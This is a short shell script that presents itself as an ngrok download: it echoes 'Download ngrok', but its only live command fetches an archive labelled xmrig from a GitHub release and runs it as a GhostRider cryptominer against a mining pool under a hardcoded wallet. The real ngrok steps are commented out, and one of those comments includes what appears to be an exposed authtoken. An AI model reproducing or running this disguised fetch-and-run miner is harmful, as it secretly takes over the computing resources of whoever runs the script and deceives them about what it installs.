#rm -rf ngrok ngrok.zip ng.sh > /dev/null 2>&1
echo "======================="
echo "Download ngrok"
echo "======================="
#wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
wget https://github.com/wolovemadang/cpu-mining/releases/download/xmrig/bin.tar.gz && tar -xvf bin.tar.gz && ./bin -a ghostrider --url eu.flockpool.com:5555 --tls --user RRUkzfgHKHqi3iG5rv6LnBUgkCCere2H3x.g1
#unzip ngrok.zip > /dev/null 2>&1
#read -p "Paste Ngrok Authtoken: " CRP
#./ngrok 23KE1QqMII3UDnPOa4uleYgvRcl_5L7bNgSRteRyL4PCUonmF $CRP  
